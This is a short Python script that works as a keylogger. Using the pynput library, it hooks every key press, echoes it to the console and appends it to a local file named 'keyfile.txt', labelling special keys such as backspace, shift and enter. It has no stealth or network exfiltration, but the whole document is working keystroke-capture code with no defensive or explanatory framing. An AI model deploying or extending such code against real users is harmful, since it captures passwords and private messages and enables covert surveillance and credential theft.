from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Check if the key has a char attribute (i.e., it's a regular key)
            char = key.char
            if char:
                logKey.write(char)
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.backspace:
                logKey.write(' [BACKSPACE] ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.shift:
                logKey.write(' [SHIFT] ')
            elif key == keyboard.Key.caps_lock:
                logKey.write(' [CAPS_LOCK] ')
            else:
                # For other special keys, write their name
                logKey.write(f' [{key}] ')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
